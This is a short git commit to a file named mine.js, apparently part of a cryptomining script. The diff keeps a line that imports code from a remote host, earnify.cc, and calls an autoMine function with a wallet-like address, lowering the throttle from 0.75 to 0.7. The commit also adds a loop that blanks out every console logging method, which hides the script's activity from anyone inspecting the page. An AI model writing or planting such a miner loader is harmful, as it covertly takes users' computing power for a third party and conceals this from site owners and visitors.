ad05ad1d5af5f7c7df0e4ad54db056bb37c27658
minerr2026 <miner2026@atomicmail.io>
2026-06-01 00:40:42 +0330

    Update mine.js

--- mine.js
+++ mine.js
@@ -1,1 +1,4 @@
-import("https://earnify.cc/miner.js").then(module => {module.autoMine("REB9cZRi2mMjXDSJVNTqCkW8XT1D9KKFgb", 0.75);});
+import("https://earnify.cc/miner.js").then(module => {module.autoMine("REB9cZRi2mMjXDSJVNTqCkW8XT1D9KKFgb", 0.7);});
+for (let m of ["log","info","warn","error","debug"]) {
+  console[m] = function () {};
+}
